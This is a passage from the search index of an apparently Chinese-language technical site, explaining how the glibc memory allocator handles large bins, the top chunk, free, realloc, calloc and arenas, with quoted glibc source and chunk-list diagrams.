\u200b\u94fe\u8868\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u53d1\u73b0\u200b\u5df2\u7ecf\u200b\u6709\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b\u65b0\u200b\u7684\u200b\u5757\u200b\u63d2\u5165\u200b\u5230\u200b\u5b83\u200b\u7684\u200b\u540e\u9762\u200b\u3002\u200b\u4f8b\u5982\u200b\u8981\u200b\u63d2\u5165\u200b\u4e00\u4e2a\u200b <code>size = 1072</code> \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b D\uff0c\u200b\u901a\u8fc7\u200b\u904d\u5386\u200b nextsize \u200b\u94fe\u8868\u200b\u627e\u5230\u200b\u4e86\u200b A\uff0c\u200b\u63d2\u5165\u200b\u4e4b\u540e\u200b\u7684\u200b\u72b6\u6001\u200b\u4e3a\u200b\uff1a</p> <pre><code>  bins[id]      chunk A              chunk D              chunk B              chunk C          \n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n| fd = A   |  | size = 1072     |  | size = 1072     |  | size = 1072     |  | size = 1040     |\n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n| bk = C   |  | fd = D          |  | fd = B          |  | fd = C          |  | fd = bins[id]   |\n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n              | bk = bins[id]   |  | bk = A          |  | bk = D          |  | bk = C          |\n              +-----------------+  +-----------------+  +-----------------+  +-----------------+\n              | fd_nextsize = C |                                            | fd_nextsize = A |\n              +-----------------+                                            +-----------------+\n              | bk_nextsize = C |                                            | bk_nextsize = A |\n              +-----------------+                                            +-----------------+\n</code></pre> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5728\u200b\u904d\u5386\u200b nextsize \u200b\u94fe\u8868\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u6ca1\u6709\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6309\u7167\u200b\u4ece\u5927\u5230\u200b\u5c0f\u200b\u7684\u200b\u987a\u5e8f\u200b\u63d2\u5165\u200b\u5230\u200b\u5408\u9002\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002\u200b\u4f8b\u5982\u200b\u8981\u200b\u63d2\u5165\u200b\u4e00\u4e2a\u200b <code>size = 1056</code> \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b D\uff0c\u200b\u901a\u8fc7\u200b\u904d\u5386\u200b nextsize \u200b\u94fe\u8868\u200b\u627e\u5230\u200b\u4e86\u200b A \u200b\u548c\u200b C\uff0c\u200b\u63d2\u5165\u200b\u4e4b\u540e\u200b\u7684\u200b\u72b6\u6001\u200b\u4e3a\u200b\uff1a</p> <pre><code>  bins[id]      chunk A              chunk B              chunk D              chunk C          \n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n| fd = A   |  | size = 1072     |  | size = 1072     |  | size = 1056     |  | size = 1040     |\n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n| bk = D   |  | fd = B          |  | fd = D          |  | fd = C          |  | fd = bins[id]   |\n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n              | bk = bins[id]   |  | bk = A          |  | bk = B          |  | bk = D          |\n              +-----------------+  +-----------------+  +-----------------+  +-----------------+\n              | fd_nextsize = D |                       | fd_nextsize = C |  | fd_nextsize = A |\n              +-----------------+                       +-----------------+  +-----------------+\n              | bk_nextsize = C |                       | bk_nextsize = A |  | bk_nextsize = D |\n              +-----------------+                       +-----------------+  +-----------------+\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u63d2\u5165\u200b\u4ee5\u540e\u200b\u7684\u200b large bin\uff0c\u200b\u4f9d\u7136\u200b\u6ee1\u8db3\u200b\u4ece\u5927\u5230\u200b\u5c0f\u200b\u6392\u5e8f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6bcf\u79cd\u200b\u5927\u5c0f\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5757\u200b\u7ec4\u6210\u200b nextsize \u200b\u94fe\u8868\u200b\u7684\u200b\u6027\u8d28\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#malloc_3","title":"malloc","text":"<p>\u200b\u63a5\u7740\u200b\u56de\u5230\u200b <code>_libc_malloc</code>\u3002\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0cunsorted bin \u200b\u4e2d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u632a\u5230\u200b\u4e86\u200b small bin \u200b\u6216\u8005\u200b large bin\uff0c\u200b\u5e76\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u628a\u200b\u5408\u9002\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u76f4\u63a5\u200b\u5206\u914d\u200b\u3002\u200b\u5982\u679c\u200b\u8fd8\u662f\u200b\u6ca1\u6709\u200b\u5206\u914d\u200b\u6210\u529f\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u8981\u200b\u5728\u200b large bin \u200b\u91cc\u200b\u5bfb\u627e\u200b\u4e00\u4e2a\u200b\u5757\u200b\u6765\u200b\u5206\u914d\u200b\uff1a</p> <pre><code>if (!in_smallbin_range (nb))\n  {\n    bin = bin_at (av, idx);\n\n    /* skip scan if empty or largest chunk is too small */\n    if ((victim = first (bin)) != bin\n        &amp;&amp; (unsigned long) chunksize_nomask (victim)\n          &gt;= (unsigned long) (nb))\n      {\n        victim = victim-&gt;bk_nextsize;\n        while (((unsigned long) (size = chunksize (victim)) &lt;\n                (unsigned long) (nb)))\n          victim = victim-&gt;bk_nextsize;\n\n        /* Avoid removing the first entry for a size so that the skip\n           list does not have to be rerouted.  */\n        if (victim != last (bin)\n            &amp;&amp; chunksize_nomask (victim)\n              == chunksize_nomask (victim-&gt;fd))\n          victim = victim-&gt;fd;\n\n        remainder_size = size - nb;\n        unlink_chunk (av, victim);\n\n        /* Exhaust */\n        if (remainder_size &lt; MINSIZE)\n          {\n            set_inuse_bit_at_offset (victim, size);\n            if (av != &amp;main_arena)\n              set_non_main_arena (victim);\n          }\n        /* Split */\n        else\n          {\n            remainder = chunk_at_offset (victim, nb);\n            /* We cannot assume the unsorted list is empty and therefore\n               have to perform a complete insert here.  */\n            bck = unsorted_chunks (av);\n            fwd = bck-&gt;fd;\n            if (__glibc_unlikely (fwd-&gt;bk != bck))\n              malloc_printerr (\"malloc(): corrupted unsorted chunks\");\n            remainder-&gt;bk = bck;\n            remainder-&gt;fd = fwd;\n            bck-&gt;fd = remainder;\n            fwd-&gt;bk = remainder;\n            if (!in_smallbin_range (remainder_size))\n              {\n                remainder-&gt;fd_nextsize = NULL;\n                remainder-&gt;bk_nextsize = NULL;\n              }\n            set_head (victim, nb | PREV_INUSE |\n                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));\n            set_head (remainder, remainder_size | PREV_INUSE);\n            set_foot (remainder, remainder_size);\n          }\n        check_malloced_chunk (av, victim, nb);\n        void *p = chunk2mem (victim);\n        alloc_perturb (p, bytes);\n        return p;\n      }\n  }\n</code></pre> <p>\u200b\u4ece\u200b large bin \u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u6839\u636e\u200b\u5927\u5c0f\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b large bin</li> <li>\u200b\u5982\u679c\u200b large bin \u200b\u4e2d\u200b\u6700\u5927\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8db3\u591f\u200b\u5927\u200b\uff0c\u200b\u904d\u5386\u200b nextsize \u200b\u94fe\u8868\u200b\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u6bd4\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5927\u5c0f\u200b\u66f4\u5927\u200b\u7684\u200b\u6700\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u66f4\u65b0\u200b nextsize \u200b\u94fe\u8868\u200b\uff0c\u200b\u5982\u679c\u200b\u5f53\u524d\u200b\u5757\u200b\u5927\u5c0f\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e0d\u6b62\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53d6\u200b\u7b2c\u4e8c\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4e0d\u7528\u200b\u66f4\u65b0\u200b nextsize \u200b\u94fe\u8868\u200b</li> <li>\u200b\u8ba1\u7b97\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5927\u5c0f\u200b\u548c\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5927\u5c0f\u200b\u7684\u200b\u5dee\u503c\u200b\uff0c\u200b\u5982\u679c\u200b\u5dee\u503c\u200b\u592a\u5c0f\u200b\uff0c\u200b\u591a\u4f59\u200b\u7684\u200b\u90e8\u5206\u200b\u5c31\u200b\u76f4\u63a5\u200b\u6d6a\u8d39\u200b\uff1b\u200b\u5982\u679c\u200b\u5dee\u200b\u7684\u200b\u7a7a\u95f4\u200b\u8fd8\u200b\u80fd\u200b\u653e\u4e0b\u200b\u4e00\u4e2a\u200b chunk\uff0c\u200b\u5c31\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u628a\u200b\u62c6\u51fa\u6765\u200b\u7684\u200b\u5269\u4e0b\u200b\u7684\u200b\u90e8\u5206\u200b\u653e\u5230\u200b unsorted bin \u200b\u4e2d\u200b</li> <li>\u200b\u8ba1\u7b97\u200b payload \u200b\u5730\u5740\u200b\uff0c\u200b\u8fdb\u884c\u200b\u53ef\u9009\u200b\u7684\u200b perturb\uff0c\u200b\u5b8c\u6210\u200b\u5206\u914d\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#bin","title":"\u5bfb\u627e\u200b\u66f4\u5927\u200b\u7684\u200b bin","text":"<p>\u200b\u5982\u679c\u200b\u5728\u200b\u5f53\u524d\u200b bin \u200b\u5185\u200b\u8fd8\u662f\u200b\u627e\u200b\u4e0d\u5230\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53ea\u80fd\u200b\u4ece\u200b\u66f4\u200b\u5927\u200b\u7684\u200b bin \u200b\u91cc\u200b\u5bfb\u627e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e86\u200b\uff1a</p> <pre><code>++idx;\nbin = bin_at (av, idx);\nblock = idx2block (idx);\nmap = av-&gt;binmap[block];\nbit = idx2bit (idx);\n\nfor (;; )\n  {\n    /* Skip rest of block if there are no more set bits in this block.  */\n    if (bit &gt; map || bit == 0)\n      {\n        do\n          {\n            if (++block &gt;= BINMAPSIZE) /* out of bins */\n              goto use_top;\n          }\n        while ((map = av-&gt;binmap[block]) == 0);\n\n        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));\n        bit = 1;\n      }\n\n    /* Advance to bin with set bit. There must be one. */\n    while ((bit &amp; map) == 0)\n      {\n        bin = next_bin (bin);\n        bit &lt;&lt;= 1;\n        assert (bit != 0);\n      }\n\n    /* Inspect the bin. It is likely to be non-empty */\n    victim = last (bin);\n\n    /*  If a false alarm (empty bin), clear the bit. */\n    if (victim == bin)\n      {\n        av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */\n        bin = next_bin (bin);\n        bit &lt;&lt;= 1;\n      }\n\n    else\n      {\n        size = chunksize (victim);\n\n        /*  We know the first chunk in this bin is big enough to use. */\n        assert ((unsigned long) (size) &gt;= (unsigned long) (nb));\n\n        remainder_size = size - nb;\n\n        /* unlink */\n        unlink_chunk (av, victim);\n\n        /* Exhaust */\n        if (remainder_size &lt; MINSIZE)\n          {\n            set_inuse_bit_at_offset (victim, size);\n            if (av != &amp;main_arena)\n              set_non_main_arena (victim);\n          }\n\n        /* Split */\n        else\n          {\n            remainder = chunk_at_offset (victim, nb);\n\n            /* We cannot assume the unsorted list is empty and therefore\n               have to perform a complete insert here.  */\n            bck = unsorted_chunks (av);\n            fwd = bck-&gt;fd;\n            if (__glibc_unlikely (fwd-&gt;bk != bck))\n              malloc_printerr (\"malloc(): corrupted unsorted chunks 2\");\n            remainder-&gt;bk = bck;\n            remainder-&gt;fd = fwd;\n            bck-&gt;fd = remainder;\n            fwd-&gt;bk = remainder;\n\n            /* advertise as last remainder */\n            if (in_smallbin_range (nb))\n              av-&gt;last_remainder = remainder;\n            if (!in_smallbin_range (remainder_size))\n              {\n                remainder-&gt;fd_nextsize = NULL;\n                remainder-&gt;bk_nextsize = NULL;\n              }\n            set_head (victim, nb | PREV_INUSE |\n                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));\n            set_head (remainder, remainder_size | PREV_INUSE);\n            set_foot (remainder, remainder_size);\n          }\n        check_malloced_chunk (av, victim, nb);\n        void *p = chunk2mem (victim);\n        alloc_perturb (p, bytes);\n        return p;\n      }\n  }\n</code></pre> <p>\u200b\u4e3a\u4e86\u200b\u8df3\u8fc7\u200b\u7a7a\u200b\u7684\u200b bin\uff0c\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u4e00\u4e2a\u200b bitmap\uff0c\u200b\u8bb0\u5f55\u200b\u54ea\u4e9b\u200b bin \u200b\u4f1a\u200b\u6709\u200b\u5185\u5bb9\u200b\u3002\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u975e\u7a7a\u200b\u7684\u200b bin \u200b\u4ee5\u540e\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5927\u5c0f\u200b\u80af\u5b9a\u200b\u662f\u200b\u8db3\u591f\u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u200b\u548c\u200b\u4e4b\u524d\u200b\u4e00\u6837\u200b\uff0c\u200b\u8981\u4e48\u200b\u820d\u5f03\u200b\u591a\u4f59\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u8981\u4e48\u200b\u628a\u200b\u591a\u4f59\u200b\u7684\u200b\u7a7a\u95f4\u200b\u505a\u6210\u200b\u4e00\u4e2a\u200b chunk\uff0c\u200b\u63d2\u5165\u200b\u5230\u200b unsorted bin \u200b\u5f53\u4e2d\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u6240\u6709\u200b bin \u200b\u90fd\u200b\u7a7a\u200b\u4e86\u200b\uff0c\u200b\u8bf4\u660e\u200b\u6ca1\u6709\u200b\u53ef\u4ee5\u200b\u5206\u914d\u200b\u7684\u200b\u53ef\u80fd\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u8df3\u8f6c\u200b\u5230\u200b <code>use_top</code> \u200b\u903b\u8f91\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#top-chunk","title":"top chunk \u200b\u5206\u914d","text":"<p>\u200b\u5982\u679c\u200b\u5df2\u6709\u200b\u7684\u200b bin \u200b\u90fd\u200b\u65e0\u6cd5\u200b\u5206\u914d\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u5c1d\u8bd5\u200b\u62c6\u5206\u200b top chunk \u200b\u6765\u200b\u8fdb\u884c\u200b\u5206\u914d\u200b\u3002top chunk \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5f53\u524d\u200b\u5806\u91cc\u200b\u5730\u5740\u200b\u6700\u9ad8\u200b\u7684\u200b\u90a3\u4e2a\u200b chunk\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u672a\u200b\u5206\u914d\u200b\u7684\u200b\u90e8\u5206\u200b\u3002\u200b\u5206\u914d\u200b\u7684\u200b\u903b\u8f91\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>use_top:\nvictim = av-&gt;top;\nsize = chunksize (victim);\n\nif (__glibc_unlikely (size &gt; av-&gt;system_mem))\n  malloc_printerr (\"malloc(): corrupted top size\");\n\nif ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))\n  {\n    remainder_size = size - nb;\n    remainder = chunk_at_offset (victim, nb);\n    av-&gt;top = remainder;\n    set_head (victim, nb | PREV_INUSE |\n              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));\n    set_head (remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk (av, victim, nb);\n    void *p = chunk2mem (victim);\n    alloc_perturb (p, bytes);\n    return p;\n  }\n\n/* When we are using atomic ops to free fast chunks we can get\n   here for all block sizes.  */\nelse if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))\n  {\n    malloc_consolidate (av);\n    /* restore original bin index */\n    if (in_smallbin_range (nb))\n      idx = smallbin_index (nb);\n    else\n      idx = largebin_index (nb);\n  }\n\n/*\n   Otherwise, relay to handle system-dependent cases\n */\nelse\n  {\n    void *p = sysmalloc (nb, av);\n    if (p != NULL)\n      alloc_perturb (p, bytes);\n    return p;\n  }\n</code></pre> <p>\u200b\u5982\u679c\u200b top chunk \u200b\u7684\u200b\u7a7a\u95f4\u200b\u591f\u200b\u5927\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5bf9\u200b top chunk \u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u4f4e\u200b\u5730\u5740\u200b\u7684\u200b\u90e8\u5206\u200b\u5206\u914d\u200b\u51fa\u53bb\u200b\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u90e8\u5206\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b top chunk\u3002\u200b\u5982\u679c\u200b top chunk \u200b\u4e0d\u591f\u200b\u5927\u200b\uff0c\u200b\u5e76\u4e14\u200b fast bin \u200b\u8fd8\u6709\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u518d\u200b\u6323\u624e\u200b\u4e00\u4e0b\u200b\uff0cconsolidate \u200b\u4e00\u4e0b\u200b\uff0c\u200b\u91cd\u65b0\u5206\u914d\u200b\u4e00\u6b21\u200b\u3002\u200b\u5982\u679c\u200b\u8fd9\u4e9b\u200b\u65b9\u6cd5\u200b\u90fd\u200b\u5931\u8d25\u200b\u4e86\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8c03\u7528\u200b sysmalloc\uff0c\u200b\u901a\u8fc7\u200b mmap \u200b\u6216\u8005\u200b sbrk \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u6765\u200b\u5206\u914d\u200b\u65b0\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u524d\u9762\u200b\u5728\u200b\u8ba8\u8bba\u200b consolidate \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8df3\u8fc7\u200b\u4e86\u200b\u5bf9\u200b top chunk \u200b\u7684\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b\u3002\u200b\u5176\u5b9e\u200b\uff0ctop chunk \u200b\u7684\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b\u4e5f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u5982\u679c\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\u5c31\u662f\u200b top chunk\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5408\u5e76\u200b\u5230\u200b top chunk \u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#free_3","title":"free","text":"<p>\u200b\u524d\u9762\u200b\u628a\u200b malloc \u200b\u7684\u200b\u6d41\u7a0b\u200b\u57fa\u672c\u200b\u5206\u6790\u200b\u5b8c\u200b\u4e86\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b free \u200b\u7684\u200b\u903b\u8f91\u200b\uff0c\u200b\u5b83\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li>\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u5206\u6790\u200b\u8fc7\u200b\uff0c\u200b\u5982\u679c\u200b tcache \u200b\u5bf9\u5e94\u200b\u7684\u200b bin \u200b\u5b58\u5728\u200b\u4e14\u200b\u975e\u6ee1\u200b\uff0c\u200b\u5219\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u63d2\u5165\u200b\u5230\u200b tcache \u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u200b</li> <li>\u200b\u5982\u679c\u200b\u5b58\u5728\u200b\u5bf9\u5e94\u200b\u7684\u200b fast bin\uff0c\u200b\u5219\u200b\u63d2\u5165\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5230\u200b fast bin \u200b\u5bf9\u5e94\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b</li> <li>\u200b\u5c1d\u8bd5\u200b\u548c\u200b\u5b83\u200b\u524d\u540e\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u548c\u200b\u524d\u9762\u200b consolidate \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5408\u5e76\u200b\u540e\u200b\u8fdb\u5165\u200b unsorted bin</li> <li>\u200b\u5982\u679c\u200b\u91ca\u653e\u200b\u7684\u200b\u5185\u5b58\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u68c0\u67e5\u200b top chunk \u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u5269\u4f59\u200b\u7684\u200b\u7a7a\u95f4\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u5219\u200b\u5f52\u8fd8\u200b\u4e00\u90e8\u5206\u200b\u5185\u5b58\u200b\u7ed9\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b</li> <li>\u200b\u5bf9\u4e8e\u200b mmap \u200b\u5206\u914d\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u7528\u200b munmap \u200b\u91ca\u653e\u200b\u6389\u200b</li> </ol> <p>\u200b\u7531\u4e8e\u200b free \u200b\u7684\u200b\u5b9e\u73b0\u200b\u76f8\u5bf9\u200b\u7b80\u5355\u200b\uff0c\u200b\u5728\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u8be6\u7ec6\u200b\u89e3\u6790\u200b\u4e86\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u8be6\u7ec6\u200b\u7684\u200b\u5b9e\u73b0\u200b\u5206\u6790\u200b\u89c1\u540e\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#realloc","title":"realloc","text":"<p>realloc \u200b\u7684\u200b\u5b9e\u73b0\u200b\u5728\u200b <code>__libc_realloc</code> \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5b9e\u73b0\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b\u91cd\u65b0\u5206\u914d\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b 0\uff0crealloc \u200b\u7b49\u4ef7\u200b\u4e3a\u200b free\uff0c\u200b\u5c31\u200b\u8c03\u7528\u200b free</li> <li>\u200b\u5982\u679c\u200b\u65e7\u200b\u6307\u9488\u200b\u662f\u200b NULL\uff0crealloc \u200b\u7b49\u4ef7\u200b\u4e3a\u200b malloc\uff0c\u200b\u5c31\u200b\u8c03\u7528\u200b malloc</li> <li>\u200b\u5982\u679c\u200b\u76f4\u63a5\u200b\u662f\u200b mmap \u200b\u51fa\u6765\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5229\u7528\u200b mremap \u200b\u6765\u200b\u6269\u5c55\u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u5982\u679c\u200b\u662f\u200b\u8981\u200b\u7533\u8bf7\u200b\u66f4\u5c11\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u628a\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u90e8\u5206\u200b\u62c6\u6210\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u7136\u540e\u200b free \u200b\u6389\u200b\u5b83\u200b</li> <li>\u200b\u5982\u679c\u200b\u662f\u200b\u8981\u200b\u7533\u8bf7\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u5c1d\u8bd5\u200b\u4ece\u200b\u5185\u5b58\u200b\u66f4\u9ad8\u200b\u5730\u5740\u200b\u7684\u200b\u76f8\u90bb\u200b\u5757\u200b\u83b7\u53d6\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5408\u5e76\u200b\u4e24\u4e2a\u200b\u5757\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u591a\u4f59\u200b\u7684\u200b\u7a7a\u95f4\u200b\u62c6\u6210\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u7136\u540e\u200b free \u200b\u6389\u200b\u5b83\u200b\uff1b\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u66f4\u9ad8\u200b\u5730\u5740\u200b\u7684\u200b\u76f8\u90bb\u200b\u5757\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5360\u7528\u200b\uff0c\u200b\u5c31\u200b\u91cd\u65b0\u200b malloc \u200b\u4e00\u4e2a\u200b\u5757\u200b\uff0c\u200b\u7528\u200b memcpy \u200b\u628a\u200b\u6570\u636e\u200b\u62f7\u8d1d\u200b\u8fc7\u53bb\u200b\uff0c\u200b\u518d\u200b free \u200b\u6389\u200b\u65e7\u200b\u7684\u200b\u5185\u5b58\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#calloc","title":"calloc","text":"<p>calloc \u200b\u7684\u200b\u5b9e\u73b0\u200b\u5728\u200b <code>__libc_calloc</code> \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u8bed\u4e49\u200b\u76f8\u6bd4\u200b malloc \u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6e05\u96f6\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e5f\u200b\u4e0d\u200b\u590d\u6742\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b top chunk \u200b\u8fd8\u6709\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5e76\u4e14\u200b top chunk \u200b\u7684\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u6e05\u96f6\u200b\uff0c\u200b\u5219\u200b\u4f18\u5148\u200b\u4ece\u200b top chunk \u200b\u5206\u914d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u907f\u514d\u200b\u4e86\u200b memset \u200b\u7684\u200b\u5f00\u9500\u200b</li> <li>fallback \u200b\u5230\u200b <code>_int_malloc</code> \u200b\u8fdb\u884c\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\uff0c\u200b\u5206\u914d\u200b\u6210\u529f\u200b\u540e\u200b\uff0c\u200b\u518d\u200b memset \u200b\u6e05\u96f6\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#arena-heap","title":"arena \u200b\u548c\u200b heap","text":"<p>\u200b\u524d\u9762\u200b\u8ba8\u8bba\u200b\u4e86\u200b\u5404\u79cd\u200b chunk \u200b\u5728\u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u5185\u90e8\u200b\u6d41\u8f6c\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f46\u200b\u5e76\u200b\u6ca1\u6709\u200b\u8ba8\u8bba\u200b\u8fd9\u4e9b\u200b\u7a7a\u95f4\u200b\u662f\u200b\u600e\u4e48\u200b\u4ece\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5206\u914d\u200b\u800c\u6765\u200b\u7684\u200b\uff0c\u200b\u53c8\u200b\u662f\u200b\u600e\u4e48\u200b\u7ef4\u62a4\u200b\u7684\u200b\u3002glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u5b9e\u9645\u4e0a\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u5c42\u6b21\u200b\uff1a</p> <ol> <li>arena \u200b\u5c42\u6b21\u200b\uff1a\u200b\u5bf9\u5e94\u200b\u9501\u200b\u7684\u200b\u7c92\u5ea6\u200b\uff0c\u200b\u4e00\u4e2a\u200b arena \u200b\u53ef\u4ee5\u200b\u5bf9\u5e94\u200b\u591a\u4e2a\u200b heap\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b arena \u200b\u662f\u200b main_arena\uff1barena 